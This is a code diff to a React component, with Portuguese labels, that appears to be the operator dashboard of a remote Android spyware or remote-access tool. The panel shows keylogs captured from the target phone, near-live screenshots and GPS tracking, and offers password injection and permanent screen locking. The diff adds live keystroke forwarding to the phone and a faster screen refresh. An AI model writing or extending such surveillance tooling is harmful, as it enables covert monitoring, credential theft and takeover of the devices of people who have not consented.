@@ -1,9 +1,8 @@
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Input } from "@/components/ui/input";
-import LockedScreen from "@/components/LockedScreen";
 import { trpc } from "@/lib/trpc";
 
 interface DeviceDetailsProps {
@@ -23,6 +22,7 @@ export default function DeviceDetails({
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
   const [injectText, setInjectText] = useState("");
+  const liveViewRef = useRef<HTMLDivElement>(null);
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -81,10 +81,10 @@ export default function DeviceDetails({
     },
   });
 
-  // Latest screenshot for live view
+  // Latest screenshot for live view — atualiza a cada 1.5s para ficar próximo ao tempo real
   const { data: latestScreenshot, refetch: refetchScreenshot } = trpc.device.latestScreenshot.useQuery(
     { deviceId: Number(deviceId) },
-    { refetchInterval: isLiveActive ? 4000 : false, enabled: isLiveActive }
+    { refetchInterval: isLiveActive ? 1500 : false, enabled: isLiveActive }
   );
 
   // All screenshots for the screenshots tab
@@ -92,6 +92,32 @@ export default function DeviceDetails({
     { deviceId: Number(deviceId), limit: 20 },
     { refetchInterval: 8000 }
   );
+
+  // Captura teclado do painel e envia para o celular quando controle está ativo
+  useEffect(() => {
+    if (!isControlActive) return;
+
+    const handleKeyDown = (e: KeyboardEvent) => {
+      // Ignora se o foco está em um input/textarea do painel
+      const tag = (e.target as HTMLElement)?.tagName;
+      if (tag === "INPUT" || tag === "TEXTAREA") return;
+
+      e.preventDefault();
+
+      let value = "";
+      if (e.key === "Enter") value = "\n";
+      else if (e.key === "Backspace") value = "\b";
+      else if (e.key === "Tab") value = "\t";
+      else if (e.key === " ") value = " ";
+      else if (e.key.length === 1) value = e.key;
+      else return; // teclas especiais (F1, Shift, etc.) ignoradas
+
+      sendTextMutation.mutate({ deviceId: Number(deviceId), value });
+    };
+
+    window.addEventListener("keydown", handleKeyDown);
+    return () => window.removeEventListener("keydown", handleKeyDown);
+  }, [isControlActive, deviceId]);
 
   const handleScreenshot = () => {
     refetchScreenshot();
@@ -116,6 +142,7 @@ export default function DeviceDetails({
   };
 
   const handleLockScreen = () => {
+    // Envia comando de bloqueio para o CELULAR — não trava o painel
     lockMutation.mutate({ deviceId: Number(deviceId) });
   };
 
@@ -167,10 +194,6 @@ export default function DeviceDetails({
     return d.toLocaleTimeString("pt-BR");
   };
 
-  if (isScreenLocked) {
-    return <LockedScreen deviceName={deviceName} onUnlock={handleUnlockScreen} />;
-  }
-
   return (
     <div className="space-y-6 pb-8">
       {/* Header */}
@@ -203,16 +226,26 @@ export default function DeviceDetails({
         </Button>
         <Button
           onClick={handleActivateControl}
-          className="bg-blue-600 hover:bg-blue-700 text-white"
+          className={`text-white ${isControlActive ? "bg-green-700 hover:bg-green-800 ring-2 ring-green-400" : "bg-blue-600 hover:bg-blue-700"}`}
         >
-          🎮 Ativar Controle
+          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
         </Button>
         <Button
           onClick={handleLockScreen}
-          className="bg-orange-600 hover:bg-orange-700 text-white"
+          disabled={lockMutation.isPending}
+          className={`text-white ${isScreenLocked ? "bg-orange-800 hover:bg-orange-900" : "bg-orange-600 hover:bg-orange-700"}`}
         >
-          🚫 Travar Tela
+          🚫 {isScreenLocked ? "Tela Travada ✓" : "Travar Tela"}
         </Button>
+        {isScreenLocked && (
+          <Button
+            onClick={handleUnlockScreen}
+            disabled={unlockMutation.isPending}
+            className="bg-green-600 hover:bg-green-700 text-white"
+          >
+            🔓 Destravar Tela
+          </Button>
+        )}
         <Button
           onClick={handleRemoveDevice}
           className="bg-red-700 hover:bg-red-800 text-white"
@@ -224,36 +257,11 @@ export default function DeviceDetails({
       {/* Tabs */}
       <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
         <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
-          <TabsTrigger
-            value="info"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            ℹ️ Informações
-          </TabsTrigger>
-          <TabsTrigger
-            value="commands"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            ⚙️ Comandos
-          </TabsTrigger>
-          <TabsTrigger
-            value="screenshots"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            📸 Screenshots
-          </TabsTrigger>
-          <TabsTrigger
-            value="keylogs"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            ⌨️ Keylogs
-          </TabsTrigger>
-          <TabsTrigger
-            value="history"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            📜 Histórico
-          </TabsTrigger>
+          <TabsTrigger value="info" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">ℹ️ Informações</TabsTrigger>
+          <TabsTrigger value="commands" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">⚙️ Comandos</TabsTrigger>
+          <TabsTrigger value="screenshots" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">📸 Screenshots</TabsTrigger>
+          <TabsTrigger value="keylogs" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">⌨️ Keylogs</TabsTrigger>
+          <TabsTrigger value="history" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">📜 Histórico</TabsTrigger>
         </TabsList>
 
         {/* Aba: Informações */}
@@ -262,62 +270,27 @@ export default function DeviceDetails({
             <Card className="bg-slate-800 border-slate-700 p-6">
               <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
               <div className="space-y-3 text-slate-300">
-                <div>
-                  <p className="text-slate-400 text-sm">Nome do Dispositivo</p>
-                  <p className="font-semibold">{deviceName}</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Modelo</p>
-                  <p className="font-semibold">Samsung Galaxy A12</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Sistema Operacional</p>
-                  <p className="font-semibold">Android 11</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Versão</p>
-                  <p className="font-semibold">11.0.1</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Localização</p>
-                  <p className="font-semibold">São Paulo, SP</p>
-                </div>
+                <div><p className="text-slate-400 text-sm">Nome do Dispositivo</p><p className="font-semibold">{deviceName}</p></div>
+                <div><p className="text-slate-400 text-sm">Modelo</p><p className="font-semibold">Samsung Galaxy A12</p></div>
+                <div><p className="text-slate-400 text-sm">Sistema Operacional</p><p className="font-semibold">Android 11</p></div>
+                <div><p className="text-slate-400 text-sm">Versão</p><p className="font-semibold">11.0.1</p></div>
+                <div><p className="text-slate-400 text-sm">Localização</p><p className="font-semibold">São Paulo, SP</p></div>
               </div>
             </Card>
-
             <Card className="bg-slate-800 border-slate-700 p-6">
               <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
               <div className="space-y-3">
                 <div>
-                  <div className="flex justify-between mb-1">
-                    <p className="text-slate-400 text-sm">Bateria</p>
-                    <p className="text-cyan-400 font-semibold">85%</p>
-                  </div>
-                  <div className="w-full bg-slate-700 rounded-full h-2">
-                    <div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div>
-                  </div>
+                  <div className="flex justify-between mb-1"><p className="text-slate-400 text-sm">Bateria</p><p className="text-cyan-400 font-semibold">85%</p></div>
+                  <div className="w-full bg-slate-700 rounded-full h-2"><div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div></div>
                 </div>
                 <div>
-                  <div className="flex justify-between mb-1">
-                    <p className="text-slate-400 text-sm">Memória</p>
-                    <p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p>
-                  </div>
-                  <div className="w-full bg-slate-700 rounded-full h-2">
-                    <div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div>
-                  </div>
+                  <div className="flex justify-between mb-1"><p className="text-slate-400 text-sm">Memória</p><p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p></div>
+                  <div className="w-full bg-slate-700 rounded-full h-2"><div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div></div>
                 </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Sinal</p>
-                  <p className="text-cyan-400 font-semibold">📶 Excelente</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Temperatura</p>
-                  <p className="text-cyan-400 font-semibold">36°C</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Último Acesso</p>
-                  <p className="text-cyan-400 font-semibold">Agora</p>
-                </div>
+                <div><p className="text-slate-400 text-sm">Sinal</p><p className="text-cyan-400 font-semibold">📶 Excelente</p></div>
+                <div><p className="text-slate-400 text-sm">Temperatura</p><p className="text-cyan-400 font-semibold">36°C</p></div>
+                <div><p className="text-slate-400 text-sm">Último Acesso</p><p className="text-cyan-400 font-semibold">Agora</p></div>
               </div>
             </Card>
           </div>
@@ -326,14 +299,14 @@ export default function DeviceDetails({
         {/* Aba: Comandos */}
         <TabsContent value="commands" className="space-y-4">
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            {[
+            {([
               { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
               { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
               { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
               { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
               { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
               { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
-            ].map((cmd, idx) => (
+            ]).map((cmd, idx) => (
               <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                 <div className="flex items-start justify-between">
                   <div>
@@ -342,9 +315,7 @@ export default function DeviceDetails({
                     <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                   </div>
                 </div>
-                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">
-                  Executar
-                </Button>
+                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">Executar</Button>
               </Card>
             ))}
           </div>
@@ -390,15 +361,11 @@ export default function DeviceDetails({
                 >
                   🗑️ Remover Selecionados ({selectedKeylogs.size})
                 </Button>
-                <Button
-                  onClick={handleRemoveAllKeylogs}
-                  className="bg-red-700 hover:bg-red-800 text-white"
-                >
+                <Button onClick={handleRemoveAllKeylogs} className="bg-red-700 hover:bg-red-800 text-white">
                   ⚠️ Remover Todos
                 </Button>
               </div>
             </div>
-
             {keylogsLoading ? (
               <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
             ) : keylogs.length === 0 ? (
@@ -470,10 +437,12 @@ export default function DeviceDetails({
               <h3 className="text-cyan-400 font-bold">
                 🔴 Visualização Ao Vivo
                 {isControlActive && (
-                  <span className="ml-2 text-xs text-green-400 font-normal animate-pulse">● Controle Ativo — clique na tela</span>
+                  <span className="ml-2 text-xs text-green-400 font-normal animate-pulse">
+                    ● Controle Ativo — clique na tela ou digite pelo teclado
+                  </span>
                 )}
                 {!isControlActive && (
-                  <span className="ml-2 text-xs text-slate-400 font-normal">atualiza a cada 4s</span>
+                  <span className="ml-2 text-xs text-slate-400 font-normal">atualiza a cada 1.5s</span>
                 )}
               </h3>
               <Button
@@ -490,14 +459,16 @@ export default function DeviceDetails({
                   <div className="bg-gradient-to-b from-slate-900 to-slate-800 rounded-3xl border-8 border-slate-900 p-2 shadow-2xl">
                     <div className="h-5 bg-black rounded-b-3xl mx-auto w-32 mb-1"></div>
                     <div
-                      className={`rounded-2xl overflow-hidden bg-black relative ${isControlActive ? "cursor-crosshair" : ""}`}
+                      ref={liveViewRef}
+                      className={`rounded-2xl overflow-hidden bg-black relative select-none ${isControlActive ? "cursor-pointer" : ""}`}
                       onClick={handleLiveViewClick}
                     >
                       <img
                         src={latestScreenshot.screenshotUrl}
                         alt="Screenshot ao vivo"
                         className="w-full object-contain"
-                        style={{ maxHeight: "640px" }}
+                        style={{ maxHeight: "640px", pointerEvents: "none" }}
+                        draggable={false}
                       />
                       {isControlActive && (
                         <div className="absolute inset-0 border-2 border-green-400 rounded-2xl pointer-events-none" />
@@ -510,6 +481,11 @@ export default function DeviceDetails({
                   <p className="text-center text-slate-500 text-xs mt-2">
                     Capturado: {new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}
                   </p>
+                  {isControlActive && (
+                    <p className="text-center text-green-400 text-xs mt-1">
+                      🎮 Clique para tocar • Digite no teclado para digitar no celular
+                    </p>
+                  )}
                 </div>
               ) : (
                 <div className="flex flex-col items-center justify-center py-16 text-slate-400">
@@ -530,6 +506,7 @@ export default function DeviceDetails({
             <h3 className="text-green-400 font-bold mb-3">💉 Injeção de Texto / Senha</h3>
             <p className="text-slate-400 text-xs mb-3">
               Digite um texto ou senha e clique em Injetar — será preenchido no campo ativo do celular.
+              Você também pode digitar diretamente pelo teclado enquanto o controle está ativo.
             </p>
             <div className="flex gap-2">
               <Input
@@ -540,6 +517,7 @@ export default function DeviceDetails({
                 className="flex-1 bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                 onKeyDown={(e) => {
                   if (e.key === "Enter" && injectText.trim()) {
+                    e.stopPropagation();
                     sendTextMutation.mutate({ deviceId: Number(deviceId), value: injectText });
                   }
                 }}
